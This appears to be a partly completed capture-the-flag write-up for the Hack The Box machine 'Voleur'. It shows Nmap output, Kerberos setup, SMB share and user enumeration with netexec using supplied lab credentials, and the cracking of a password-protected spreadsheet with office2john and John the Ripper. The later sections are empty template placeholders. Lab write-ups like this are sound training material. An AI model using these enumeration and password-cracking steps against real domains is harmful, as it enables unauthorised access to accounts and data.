
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---

## initial creds

```
ryan.naylor / HollowOct31Nyt
```
## Enumeration

### Nmap Scan

```
sudo nmap -sV -sC voleur.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-05 15:47 EDT
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 15:48 (0:00:00 remaining)
Nmap scan report for voleur.htb (10.129.232.130)
Host is up (0.030s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 03:47:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m01s
| smb2-time: 
|   date: 2026-10-06T03:47:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.22 seconds

```

### Service Enumeration

```
 sudo ntpdate voleur.htb                                         
2026-10-05 23:57:38.982151 (-0400) +28814.853587 +/- 0.014269 voleur.htb 10.129.232.130 s1 no-leap
CLOCK: time stepped by 28814.853587
                                                                                                                    
┌──(kali㉿kali)-[~/machines/voleur]
└─$ nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
SMB         10.129.232.130  445    10.129.232.130   [*]  x64 (name:10.129.232.130) (domain:10.129.232.130) (signing:True) (SMBv1:False) (NTLM:False)                                                                                    
SMB         10.129.232.130  445    10.129.232.130   [-] 10.129.232.130\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

## Kerberos ticket:

editing krb5.conf

```
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    VOLEUR.HTB = {
        kdc = DC.voleur.htb
        admin_server = DC.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

getting a ticket as ryan:

```
kinit ryan.naylor@VOLEUR.HTB
Password for ryan.naylor@VOLEUR.HTB:
```

```
export KRB5CCNAME=ryan.naylor.ccache
```

```
sudo ntpdate DC.voleur.htb                                            
2026-10-06 00:09:23.010738 (-0400) +28829.156843 +/- 0.014653 DC.voleur.htb 10.129.232.130 s1 no-leap
CLOCK: time stepped by 28829.156843
```

``` nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         DC.voleur.htb   445    DC               [*] Enumerated shares
SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark
SMB         DC.voleur.htb   445    DC               -----           -----------     ------
SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin
SMB         DC.voleur.htb   445    DC               C$                              Default share
SMB         DC.voleur.htb   445    DC               Finance                         
SMB         DC.voleur.htb   445    DC               HR                              
SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC
SMB         DC.voleur.htb   445    DC               IT              READ            
SMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share 
SMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share 
                                                                                                           
```

## users enumeration

```
nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         DC.voleur.htb   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         DC.voleur.htb   445    DC               Administrator                 2025-01-28 20:35:13 0       Built-in account for administering the computer/domain 
SMB         DC.voleur.htb   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         DC.voleur.htb   445    DC               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account 
SMB         DC.voleur.htb   445    DC               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician 
SMB         DC.voleur.htb   445    DC               marie.bryant                  2025-01-29 09:21:07 0       First-Line Support Technician 
SMB         DC.voleur.htb   445    DC               lacey.miller                  2025-01-29 09:20:10 0       Second-Line Support Technician 
SMB         DC.voleur.htb   445    DC               svc_ldap                      2025-01-29 09:20:54 0        
SMB         DC.voleur.htb   445    DC               svc_backup                    2025-01-29 09:20:36 0        
SMB         DC.voleur.htb   445    DC               svc_iis                       2025-01-29 09:20:45 0        
SMB         DC.voleur.htb   445    DC               jeremy.combs                  2025-01-29 15:10:32 0       Third-Line Support Technician 
SMB         DC.voleur.htb   445    DC               svc_winrm                     2025-01-31 09:10:12 0        
SMB         DC.voleur.htb   445    DC               [*] Enumerated 11 local users: VOLEUR

```

### Share enumeration

```
smbclient -k //DC.voleur.htb/IT
WARNING: The option -k|--kerberos is deprecated!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 04:10:01 2025
  ..                                DHS        0  Thu Jul 24 16:09:59 2025
  First-Line Support                  D        0  Wed Jan 29 04:40:17 2025

                5311743 blocks of size 4096. 999130 blocks available
smb: \> cd First-Line Support
cd \First-Line\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd 'First-Line Support'
cd \'First-Line\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd "First-Line Support"
smb: \First-Line Support\> ls
  .                                   D        0  Wed Jan 29 04:40:17 2025
  ..                                  D        0  Wed Jan 29 04:10:01 2025
  Access_Review.xlsx                  A    16896  Thu Jan 30 09:14:25 2025

                5311743 blocks of size 4096. 999130 blocks available
smb: \First-Line Support\> get Access_Review.xlsx
getting file \First-Line Support\Access_Review.xlsx of size 16896 as Access_Review.xlsx (136.4 KiloBytes/sec) (average 136.4 KiloBytes/sec)
smb: \First-Line Support\> 

```

using office2john 

```
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

```
 john access_review.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (?)     
1g 0:00:00:02 DONE (2026-10-05 16:23) 0.4878g/s 390.2p/s 390.2c/s 390.2C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
---
## Foothold

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
# Commands used
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)